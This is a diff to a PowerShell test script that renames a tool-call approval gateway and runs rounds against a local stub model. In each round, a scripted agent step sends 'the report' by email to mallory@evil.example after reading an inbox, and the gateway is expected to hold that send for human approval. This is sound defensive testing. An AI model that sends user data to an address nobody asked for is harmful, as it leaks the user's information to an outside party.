@@ -9,11 +9,11 @@
 # stub on 127.0.0.1. No model is called. Everything it makes lives in one temp folder.
 #
 # In each round the stub model reads the inbox, then tries to send to mallory@evil.example, whom the
-# prompt never names. SaysWho holds that call and asks. The script then looks at what really reached the
+# prompt never names. Magistrate holds that call and asks. The script then looks at what really reached the
 # server, so the answer doesn't rest on what the screen appeared to do.
 $ErrorActionPreference = 'Stop'
 $repo = (Resolve-Path (Join-Path $PSScriptRoot '../..')).Path
-$work = Join-Path ([IO.Path]::GetTempPath()) ('sayswho-dialog-' + [guid]::NewGuid().ToString('N'))
+$work = Join-Path ([IO.Path]::GetTempPath()) ('magistrate-dialog-' + [guid]::NewGuid().ToString('N'))
 $exe = if ($env:OS -eq 'Windows_NT') { '.exe' } else { '' }
 $removedEnv = @()
 $addedEnv = @('CLAUDE_CONFIG_DIR', 'ANTHROPIC_BASE_URL', 'ANTHROPIC_AUTH_TOKEN', 'DISABLE_TELEMETRY',
@@ -31,8 +31,8 @@ function Invoke-Round([string]$name, [string]$instruction, [string[]]$clientFlag
     $sends = Join-Path $work 'sends.log'
     if (Test-Path $sends) { Remove-Item $sends }
     $steps = Join-Path $work "$name.steps"
-    [IO.File]::WriteAllText($steps, '[{"tool":"mcp__sayswho__mail__read_inbox","input":{}},' +
-        '{"tool":"mcp__sayswho__mail__send_mail","input":{"to":"mallory@evil.example","body":"the report"}}]')
+    [IO.File]::WriteAllText($steps, '[{"tool":"mcp__magistrate__mail__read_inbox","input":{}},' +
+        '{"tool":"mcp__magistrate__mail__send_mail","input":{"to":"mallory@evil.example","body":"the report"}}]')
     $portFile = Join-Path $work "$name.port"
     $stub = Start-Process -FilePath $model -NoNewWindow -PassThru `
         -ArgumentList ('-log "{0}" -portfile "{1}" -steps "{2}"' -f (Join-Path $work "$name.model.log"), $portFile, $steps) `
@@ -43,13 +43,13 @@ function Invoke-Round([string]$name, [string]$instruction, [string[]]$clientFlag
         Write-Host ''
         Write-Host "=== Round: $name" -ForegroundColor Cyan
         Write-Host 'Claude Code will open here. If it asks whether to trust the folder, say yes: it is an empty temp folder.'
-        Write-Host 'A question from SaysWho will appear, naming mallory@evil.example.'
+        Write-Host 'A question from Magistrate will appear, naming mallory@evil.example.'
         Write-Host "When it does: $instruction" -ForegroundColor Yellow
         Write-Host 'Once the model has said "done", leave with /exit and Enter, or press Ctrl+C twice.'
         Read-Host 'Press Enter to start' | Out-Null
         $state = Join-Path $work "$name-state"
         & $gateway run --policy $policy --state $state --prompt-file $prompt --client $claude.Source -- `
-            --model stub --allowedTools 'mcp__sayswho__mail__read_inbox,mcp__sayswho__mail__send_mail' @clientFlags
+            --model stub --allowedTools 'mcp__magistrate__mail__read_inbox,mcp__magistrate__mail__send_mail' @clientFlags
     } finally {
         Stop-Process -Id $stub.Id -Force -ErrorAction SilentlyContinue
     }
@@ -64,12 +64,12 @@ function Invoke-Round([string]$name, [string]$instruction, [string[]]$clientFlag
 
 try {
     New-Item -ItemType Directory -Force $work | Out-Null
-    $gateway = Join-Path $work "sayswho$exe"
+    $gateway = Join-Path $work "magistrate$exe"
     $echo = Join-Path $work "echoserver$exe"
     $model = Join-Path $work "stubmodel$exe"
     Push-Location $repo
     try {
-        go build -o $gateway ./cmd/sayswho
+        go build -o $gateway ./cmd/magistrate
         go build -o $echo ./test/interop/echoserver
         go build -o $model ./test/interop/stubmodel
     } finally {
